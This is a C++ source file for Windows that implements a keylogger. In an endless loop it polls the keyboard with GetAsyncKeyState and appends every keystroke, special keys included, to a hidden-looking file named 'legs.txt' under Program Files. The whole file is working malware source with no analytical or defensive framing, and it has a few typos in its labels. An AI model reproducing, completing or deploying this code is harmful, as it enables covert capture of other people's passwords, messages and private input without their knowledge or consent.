#include "pch.h"
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("C:\\Program Files\\TEQ\\legs.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		// << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		// << "\n";
		LOG("\n");
		return true;
	case '¾':
		// << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		// << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		// << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		// << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		// << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		// << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		// << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		// << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		// << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		// << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		// << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		// << "#ALT";
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}



void run()
{
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("C:\\Program Files\\TEQ\\legs.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}
}
